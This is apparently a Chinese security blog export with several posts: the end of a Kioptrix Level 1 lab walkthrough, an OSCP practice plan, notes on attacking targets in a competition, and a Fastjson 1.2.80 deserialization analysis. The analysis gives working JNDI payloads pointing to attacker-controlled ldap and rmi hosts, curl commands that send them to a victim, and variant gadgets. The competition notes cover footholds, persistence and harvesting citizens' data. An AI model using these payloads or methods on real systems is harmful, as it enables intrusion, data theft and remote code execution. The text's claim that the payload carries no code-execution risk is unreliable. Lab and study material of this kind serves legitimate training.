<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/1.png" alt="扫描的tcp连接内容"></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---寻找低版本的框架或者容器查找[exp]---</span><br><span class="line">nikto -host <span class="number">192</span>.<span class="number">168</span>.xxx.xx</span><br><span class="line">nuclei -u <span class="number">192</span>.<span class="number">168</span>.xxx.xx</span><br></pre></td></tr></table></figure>

<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2-0.png" alt="扫描的tcp连接内容"></p>
<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2-1.png" alt="扫描的tcp连接内容"></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查找exp利用</span><br><span class="line">searchsploit mod_ssl</span><br></pre></td></tr></table></figure>

<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2.png" alt="扫描的tcp连接内容"></p>
<p>对比可得3个可尝试exp</p>
<hr>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#编译</span><br><span class="line">gcc -o exploit <span class="number">47080</span>.c -lcrypto</span><br><span class="line">#运行对应版本</span><br><span class="line">./exploit -h								#帮助</span><br><span class="line">./exploit | grep apache-<span class="number">1</span>.<span class="number">3</span>.<span class="number">20</span>				#版本</span><br><span class="line">./exploit <span class="number">0</span>x6b <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span> <span class="number">80</span> -c <span class="number">50</span>			#运行</span><br></pre></td></tr></table></figure>

<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/3.png" alt="扫描的tcp连接内容"></p>
<p>流程是这么个流程，但是这个exp太过于久远了，难以运行</p>
<p>所以换其它的不需要lcrypto的exp运行</p>
<h5 id="我采用的攻击方式"><a href="#我采用的攻击方式" class="headerlink" title="我采用的攻击方式"></a>我采用的攻击方式</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#存在<span class="number">139</span>端口samba服务，且得知系统为linux框架</span><br></pre></td></tr></table></figure>

<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/1.png" alt="扫描的tcp连接内容"></p>
<p>搜索该服务：</p>
<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-0.png" alt="扫描的tcp连接内容"></p>
<p>发现非常多的exp，但是nmap没有版本，难不成这么多exp一个个试？</p>
<p>有两种方法msfconsole&#x2F;nuclei跑出版本，msfconsole跑出版本前提是需要存在版本泄露的漏洞，虽然nuclei也是一样，但是架不住快呀:</p>
<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-1.png" alt="扫描的tcp连接内容"></p>
<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-2.png" alt="扫描的tcp连接内容"></p>
<hr>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#或者nuclei直接跑出版本号</span><br><span class="line">nuclei.exe -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span>:<span class="number">139</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-3.png" alt="扫描的tcp连接内容"></p>
<p>跑出版本2.2.1a就可以直接跑小于2.2.8这个版本的了</p>
<p>直接编译运行即可</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#编译</span><br><span class="line">gcc <span class="number">10</span>.c -o samba_exp		#-o为输出文件</span><br></pre></td></tr></table></figure>

<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/5.png" alt="扫描的tcp连接内容"></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看帮助</span><br><span class="line">./samba_exp</span><br></pre></td></tr></table></figure>

<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/5-2.png" alt="扫描的tcp连接内容"></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#运行</span><br><span class="line">./samba_exp -b0 <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span>	#-b为目标，<span class="number">0</span>为linux</span><br></pre></td></tr></table></figure>

<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/6.png" alt="扫描的tcp连接内容"></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">找出版本后直接在msfconsole上搜索exp跑也可以</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/0.png" alt="扫描的tcp连接内容"></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">其他的服务版本都很低，可以信息搜集后用工具跑，低权限就uname -a查看内核版本，看searchsploit里面有无提权exp，或者直接cs上线跑提权工具</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>1.RCE前提是存在漏洞</p>
<p>2.渗透主要是信息搜集</p>
<p>3.主要考核了工具使用</p>
<h3 id="参考的文章"><a href="#参考的文章" class="headerlink" title="参考的文章"></a>参考的文章</h3><p><a href="https://www.cnblogs.com/KUANTECH/p/17941528">Lab 1-Vulnhub - Kioptix Level 1 - KUANTECH - 博客园</a></p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>Red team</tag>
      </tags>
  </entry>
  <entry>
    <title>oscp靶场训练</title>
    <url>/2025/08/06/oscp%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<h2 id="–-从易到难准备阶段"><a href="#–-从易到难准备阶段" class="headerlink" title="– 从易到难准备阶段"></a>– 从易到难准备阶段</h2><p>🟢 入门阶段（基础漏洞与提权练习）</p>
<table>
<thead>
<tr>
<th>靶场平台</th>
<th>推荐靶机&#x2F;课程</th>
<th>链接</th>
</tr>
</thead>
<tbody><tr>
<td><strong>VulnHub</strong></td>
<td>Kioptrix 1~5、Stapler、Mr. Robot</td>
<td><a href="https://www.vulnhub.com/">VulnHub</a></td>
</tr>
<tr>
<td><strong>TryHackMe</strong></td>
<td>Basic Pentesting、Linux PrivEsc</td>
<td><a href="https://tryhackme.com/">TryHackMe</a></td>
</tr>
<tr>
<td><strong>Hack The Box</strong></td>
<td>Lame、Blue、Legacy</td>
<td><a href="https://www.hackthebox.com/">Hack The Box</a></td>
</tr>
</tbody></table>
<p>🟡 中级阶段（模拟 OSCP 环境与 Active Directory）</p>
<table>
<thead>
<tr>
<th>靶场平台</th>
<th>推荐靶机&#x2F;课程</th>
<th>链接</th>
</tr>
</thead>
<tbody><tr>
<td><strong>OffSec Proving Grounds</strong></td>
<td>Jacko、Twiggy、HelpDesk</td>
<td><a href="https://www.offsec.com/labs/individual/">Proving Grounds</a></td>
</tr>
<tr>
<td><strong>CyberSecLabs</strong></td>
<td>Roast、Brute、Sync</td>
<td><a href="https://www.cyberseclabs.co.uk/">CyberSecLabs</a></td>
</tr>
<tr>
<td><strong>TryHackMe</strong></td>
<td>Attacktive Directory</td>
<td><a href="https://tryhackme.com/">TryHackMe</a></td>
</tr>
</tbody></table>
<p>🔴 高级阶段（接近 OSCP 考试环境）</p>
<table>
<thead>
<tr>
<th>靶场平台</th>
<th>推荐靶机&#x2F;课程</th>
<th>链接</th>
</tr>
</thead>
<tbody><tr>
<td><strong>OffSec PWK Labs</strong></td>
<td>官方 PWK 课程所有机器</td>
<td><a href="https://www.offensive-security.com/labs/individual/">PWK Labs</a></td>
</tr>
<tr>
<td><strong>Hack The Box</strong></td>
<td>Buff、OpenAdmin、Blunder、Resolute</td>
<td><a href="https://www.hackthebox.com/">Hack The Box</a></td>
</tr>
<tr>
<td><strong>Virtual Hacking Labs</strong></td>
<td>Windows&#x2F;Linux 高级靶机</td>
<td><a href="https://www.virtualhackinglabs.com/">Virtual Hacking Labs</a></td>
</tr>
</tbody></table>
<span id="more"></span>

<hr>
<h2 id="顺序"><a href="#顺序" class="headerlink" title="顺序"></a>顺序</h2><table>
<thead>
<tr>
<th>阶段</th>
<th>目标</th>
<th>平台</th>
<th>代表靶机&#x2F;课程</th>
<th>练习重点</th>
<th>时间安排</th>
</tr>
</thead>
<tbody><tr>
<td><strong>阶段1 入门</strong></td>
<td>掌握基础漏洞、工具使用</td>
<td>VulnHub</td>
<td>Kioptrix 1~5、Metasploitable 2、Mr. Robot</td>
<td>端口扫描、Web 枚举、基础提权</td>
<td>2~3 月</td>
</tr>
<tr>
<td></td>
<td></td>
<td>TryHackMe</td>
<td>Basic Pentesting、Linux PrivEsc</td>
<td>任务引导，熟悉基础流程</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>Hack The Box (HTB)</td>
<td>Lame、Blue、Legacy</td>
<td>简单靶机练习</td>
<td></td>
</tr>
<tr>
<td><strong>阶段2 核心训练</strong></td>
<td>OSCP 风格单机渗透</td>
<td>VulnHub</td>
<td>DC 系列、Stapler</td>
<td>Linux&#x2F;Windows 提权与漏洞利用</td>
<td>3~5 月</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Hack The Box</td>
<td>Optimum、Bastion、Netmon</td>
<td>无 Metasploit 漏洞利用</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>CyberSecLabs</td>
<td>基础 Linux &amp; Windows 机器</td>
<td>实战环境模拟</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>OffSec Proving Grounds Play</td>
<td>Jacko、Twiggy、HelpDesk</td>
<td>官方免费靶机，接近考试</td>
<td></td>
</tr>
<tr>
<td><strong>阶段3 内网 &amp; AD</strong></td>
<td>掌握 AD 渗透、横向移动</td>
<td>TryHackMe</td>
<td>Attacktive Directory</td>
<td>AD 域环境入门</td>
<td>4~6 月</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Hack The Box</td>
<td>Active、Forest、Sauna、Cascade</td>
<td>域控提权，Kerberoasting 等</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>CyberSecLabs</td>
<td>AD 环境机器</td>
<td>横向移动、域权限提升</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>OffSec Proving Grounds Enterprise</td>
<td>Enterprise 系列</td>
<td>官方内网环境</td>
<td></td>
</tr>
<tr>
<td><strong>阶段4 考前冲刺</strong></td>
<td>模拟考试环境，提升效率</td>
<td>OffSec PWK Labs</td>
<td>官方 Easy→Medium→Hard</td>
<td>全面实战，计时训练</td>
<td>3~4 月</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Hack The Box</td>
<td>Buff、OpenAdmin、Blunder、Resolute</td>
<td>中高难度机器冲刺</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>Virtual Hacking Labs</td>
<td>高级 Windows&#x2F;Linux 靶机</td>
<td>系统性综合训练</td>
<td></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>Red team</tag>
      </tags>
  </entry>
  <entry>
    <title>湖湘杯记录</title>
    <url>/2025/08/04/%E6%B9%96%E6%B9%98%E6%9D%AF%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="–-湖湘杯的分值只有权限分和信息分"><a href="#–-湖湘杯的分值只有权限分和信息分" class="headerlink" title="– 湖湘杯的分值只有权限分和信息分"></a>– 湖湘杯的分值只有权限分和信息分</h2><p>（新手记录）</p>
<h1 id="1-攻击顺序"><a href="#1-攻击顺序" class="headerlink" title="1.攻击顺序"></a>1.攻击顺序</h1><p>1&gt;私企-水利&#x2F;电力&#x2F;服务类别，找越权的信息分</p>
<p>2&gt;医院&#x2F;学院，找后台的权限和信息分</p>
<p>3&gt;地区&#x2F;县区，找内网的权限分和信息分</p>
<p>4&gt;省&#x2F;市，随便找找</p>
<p>5&gt;记得专门划分一个写报告，要不然挖到也没有首发，30%的分，后面信息分没了就直接不给分</p>
<span id="more"></span>

<h1 id="2-攻击手法"><a href="#2-攻击手法" class="headerlink" title="2.攻击手法"></a>2.攻击手法</h1><p>1&gt;快速确定框架，导出api和目录，查看是否存在敏感目录</p>
<p>2&gt;框架漏洞扫描和漏扫，爆破api和访问目录找未授权和越权</p>
<p>3&gt;有未授权或者越权就扩大危害（找信息分或者其他设备权限分），无则查看存在目录是否存在登录端第⑤步</p>
<p>4&gt;记录可访问接口和目录，接口跑一遍sqlmap和指纹，再次识别框架和检查注入点</p>
<blockquote>
<p>5&gt;弱口令爆破隐藏后台，后台查找文件上传点和设备或者管理员权限，cs上线sock5连接</p>
<p>5’&gt;sqlmap跑出dba获得主机权限</p>
<p>6&gt;内网权限维持，sock5同一网段，定时任务，映射ssh端口或3306端口</p>
</blockquote>
<p>&lt;1&gt;内网确定主机，内网web端，数据库</p>
<p>​	①权限-横向移动     &#x3D;&#x3D;    已知历史漏洞梭哈&#x2F;攻陷内网其他主机web&#x2F;获取其他数据库dba</p>
<p>​	②信息-扩大产出     &#x3D;&#x3D;    数据库公民信息获取&#x2F;内网web端后台信息泄露&#x2F;sms主机或者业务主机</p>
<p>&#x2F;&#x2F;分支</p>
<p>—— ③内网钓鱼</p>
<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>1.获取内网权限普遍的三种方法</p>
<p>​	①sql注入获取dba</p>
<p>​	②文件上传获取shell</p>
<p>​	③远程代码执行</p>
<p>&#x2F;&#x2F;分支</p>
<p>——-①框架漏洞梭哈&#x2F;\编辑器&#x2F;\oa框架&#x2F;\sql文件上传</p>
<p>——-②主机漏洞梭哈&#x2F;\Metasploit&#x2F;\kali</p>
<p>——-③缓冲区溢出&#x2F;\kali&#x2F;\Metasploit</p>
<p>2.现在我的能力仅限于发现和利用已经存在的漏洞，只能寻找数据与代码边界不清的地方，不能突破数据和命令的边界，当然要是让我做安全服务天天写报告我也不想</p>
<p>​	简单来说现在我就是一个加强版的<strong>指纹识别</strong></p>
<p>​	一句话概括我的能力就是	“<strong>漏洞来源于发现</strong>“	</p>
<p>​	远没有达到	“<strong>漏洞来源于挖掘</strong>“</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>Red team</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson反序列化分析</title>
    <url>/2025/07/09/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Fastjson-1-2-80-反序列化漏洞分析"><a href="#Fastjson-1-2-80-反序列化漏洞分析" class="headerlink" title="Fastjson 1.2.80 反序列化漏洞分析"></a>Fastjson 1.2.80 反序列化漏洞分析</h1><p><strong>漏洞原理</strong><br>Fastjson 在反序列化时，攻击者通过构造特殊的 JSON 字符串，利用特定类（如 <code>JdbcRowSetImpl</code>）的 <code>setAutoCommit</code> 方法触发 JNDI 注入。当目标解析恶意 JSON 时，会向攻击者控制的 JNDI 服务器发起请求，加载远程恶意类，最终导致 RCE（远程代码执行）。1.2.83 版本虽修复了部分漏洞，但在未开启 <code>safeMode</code> 且存在可利用依赖时仍可能被攻击。</p>
<p><strong>漏洞复现条件</strong></p>
<ol>
<li>Fastjson &lt; 1.2.83</li>
<li>目标环境中存在 <code>com.sun.rowset.JdbcRowSetImpl</code> 类（通常存在于 JDK 或 Tomcat 中）</li>
<li>目标未配置安全白名单或开启 <code>safeMode</code></li>
</ol>
<span id="more"></span>

<hr>
<h3 id="漏洞验证步骤（仅访问-HTTP-服务）"><a href="#漏洞验证步骤（仅访问-HTTP-服务）" class="headerlink" title="漏洞验证步骤（仅访问 HTTP 服务）"></a>漏洞验证步骤（仅访问 HTTP 服务）</h3><h4 id="1-准备-Payload"><a href="#1-准备-Payload" class="headerlink" title="1. 准备 Payload"></a>1. 准备 Payload</h4><p>以下 Payload 会让目标服务器尝试连接 ：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">#尝试访问内网</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#dnslog探测出网</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;qwq&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxxx.dnslog.cn&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>原理</strong>：<br>当 Fastjson 解析 <code>autoCommit</code> 属性时，会调用 <code>setAutoCommit(true)</code> → 触发 JNDI 查找 → 访问 <code>dataSourceName</code> 中的地址。</p>
<hr>
<p>使用工具<code>jndi_tool.jar</code>部署恶意类；工具链接：<a href="https://github.com/wyzxxz/jndi_tool">https://github.com/wyzxxz/jndi_tool</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://xxx.xxx.xx.x:xxx/Object&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-启动-HTTP-监听服务"><a href="#2-启动-HTTP-监听服务" class="headerlink" title="2. 启动 HTTP 监听服务"></a>2. 启动 HTTP 监听服务</h4><p>在 <code>192.168.1.12</code> 上执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>

<p>或使用 <code>nc</code> 监听：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8000</span><br></pre></td></tr></table></figure>

<h4 id="3-发送-Payload-到目标"><a href="#3-发送-Payload-到目标" class="headerlink" title="3. 发送 Payload 到目标"></a>3. 发送 Payload 到目标</h4><p>将 Payload 作为 POST 数据发送到目标 Fastjson 接口（如 <code>/json</code>）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/api -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span class="line"><span class="string">  &quot;dataSourceName&quot;: &quot;ldap://192.168.1.12:8000/Exploit&quot;,</span></span><br><span class="line"><span class="string">  &quot;autoCommit&quot;: true</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="4-验证漏洞"><a href="#4-验证漏洞" class="headerlink" title="4. 验证漏洞"></a>4. 验证漏洞</h4><ul>
<li><p>若在 <code>192.168.1.12:8000</code> 的 HTTP 服务收到 <strong>GET 请求</strong>（路径 <code>/Exploit</code>），证明漏洞存在。</p>
</li>
<li><p>示例日志：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">192.168.X.X - - [TIMESTAMP] &quot;GET /Exploit HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li><p><strong>依赖要求</strong>：<br>目标需存在 <code>JdbcRowSetImpl</code> 类（通常满足），若返回 <code>Class not found</code> 则说明环境缺失依赖。</p>
</li>
<li><p><strong>网络可达</strong>：<br>确保目标服务器能访问 <code>192.168.1.12:8000</code>（检查防火墙&#x2F;路由）。</p>
</li>
<li><p><strong>安全模式</strong>：<br>若目标开启 <code>safeMode</code>（禁用 autoType），Payload 将失效：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setSafeMode(<span class="literal">true</span>);  <span class="comment">// 免疫漏洞</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>无 RCE 风险</strong>：<br>此 Payload 仅触发 HTTP 请求，<strong>不会执行任意代码</strong>，符合安全测试要求。</p>
</li>
</ol>
<hr>
<h3 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h3><ul>
<li><strong>更高版本影响</strong>：Fastjson ≥1.2.84 默认关闭 autoType，需手动开启白名单。</li>
<li><strong>修复建议</strong>：<ul>
<li>升级 Fastjson 至最新版</li>
<li>启用 <code>safeMode</code></li>
<li>配置 <code>autoType</code> 白名单</li>
</ul>
</li>
</ul>
<blockquote>
<p>以上方法仅用于安全测试，请遵守法律法规。确认漏洞后请及时修复。</p>
</blockquote>
<hr>
<h1 id="Fastjson-1-2-80-反序列化漏洞详细分析（含白名单场景）"><a href="#Fastjson-1-2-80-反序列化漏洞详细分析（含白名单场景）" class="headerlink" title="Fastjson 1.2.80 反序列化漏洞详细分析（含白名单场景）"></a>Fastjson 1.2.80 反序列化漏洞详细分析（含白名单场景）</h1><h4 id="报错分析"><a href="#报错分析" class="headerlink" title="报错分析"></a>报错分析</h4><p>若存在报错 <code>org.springframework.http.converter.HttpMessageNotReadableException</code> 表明：</p>
<ol>
<li><strong>Spring MVC 正在处理请求</strong>，且使用了内置的 HTTP 消息转换器</li>
<li><strong>请求体解析失败</strong>，可能是 Fastjson 在处理恶意 payload 时抛出的异常</li>
<li><strong>环境包含 Spring&#x2F;MyBatis</strong> 可能扩展了攻击面</li>
</ol>
<hr>
<h3 id="白名单配置检查"><a href="#白名单配置检查" class="headerlink" title="白名单配置检查"></a>白名单配置检查</h3><p>当存在以下配置时，Fastjson 可能允许特定类被反序列化（绕过防护）：</p>
<h4 id="1-显式白名单配置"><a href="#1-显式白名单配置" class="headerlink" title="1. 显式白名单配置"></a>1. 显式白名单配置</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 危险的白名单配置示例</span></span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;com.sun.rowset.&quot;</span>);</span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;org.apache.tomcat.&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="2-AutoType-白名单"><a href="#2-AutoType-白名单" class="headerlink" title="2. AutoType 白名单"></a>2. AutoType 白名单</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 启用 AutoType 并添加白名单</span></span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;com.example.safe.&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="3-特定注解使用"><a href="#3-特定注解使用" class="headerlink" title="3. 特定注解使用"></a>3. 特定注解使用</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@JSONType(autoTypeCheckHandler = MySafeHandler.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="comment">// 可能被利用的 setter 方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="针对环境的增强-Payload"><a href="#针对环境的增强-Payload" class="headerlink" title="针对环境的增强 Payload"></a>针对环境的增强 Payload</h3><p>结合 Spring + MyBatis 环境，以下 payload 可能更有效（目标：触发对 <code>192.168.1.12:8000</code> 的访问）：</p>
<h4 id="方案-1：MyBatis-SQL-驱动类利用"><a href="#方案-1：MyBatis-SQL-驱动类利用" class="headerlink" title="方案 1：MyBatis SQL 驱动类利用"></a>方案 1：MyBatis SQL 驱动类利用</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="方案-2：Spring-JNDI-扩展"><a href="#方案-2：Spring-JNDI-扩展" class="headerlink" title="方案 2：Spring JNDI 扩展"></a>方案 2：Spring JNDI 扩展</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="方案-3：Tomcat-JDBC-池利用"><a href="#方案-3：Tomcat-JDBC-池利用" class="headerlink" title="方案 3：Tomcat JDBC 池利用"></a>方案 3：Tomcat JDBC 池利用</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.jdbc.pool.DataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://192.168.1.12:8000/Exploit&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="漏洞验证步骤"><a href="#漏洞验证步骤" class="headerlink" title="漏洞验证步骤"></a>漏洞验证步骤</h3><h4 id="1-启动-HTTP-监控"><a href="#1-启动-HTTP-监控" class="headerlink" title="1. 启动 HTTP 监控"></a>1. 启动 HTTP 监控</h4><p>在 <code>192.168.1.12</code> 执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python 3 (记录完整请求)</span></span><br><span class="line"><span class="comment"># linux</span></span><br><span class="line">python3 -m http.server 8000 2&gt;&amp;1 | <span class="built_in">tee</span> http.log</span><br><span class="line"></span><br><span class="line"><span class="comment">#windows</span></span><br><span class="line"><span class="comment">#powershell</span></span><br><span class="line">python -m http.server 8000 2&gt;&amp;1 | Tee-Object -FilePath http.log</span><br><span class="line"></span><br><span class="line"><span class="comment">#cmd.exe</span></span><br><span class="line">python -m http.server 8000 &gt; http.log 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用 netcat</span></span><br><span class="line">nc -lvnp 8000</span><br></pre></td></tr></table></figure>

<h4 id="2-发送恶意请求"><a href="#2-发送恶意请求" class="headerlink" title="2. 发送恶意请求"></a>2. 发送恶意请求</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST http://VICTIM_IP:PORT/vuln-endpoint \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span class="line"><span class="string">    &quot;dataSourceName&quot;: &quot;ldap://192.168.1.12:8000/FastjsonPoc&quot;,</span></span><br><span class="line"><span class="string">    &quot;autoCommit&quot;: true</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-验证成功标志"><a href="#3-验证成功标志" class="headerlink" title="3. 验证成功标志"></a>3. 验证成功标志</h4><p>在 HTTP 服务器查看访问日志：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GET /FastjsonPoc - 来自目标 IP 的请求</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="白名单绕过技巧"><a href="#白名单绕过技巧" class="headerlink" title="白名单绕过技巧"></a>白名单绕过技巧</h3><p>若目标配置了白名单，尝试这些变体：</p>
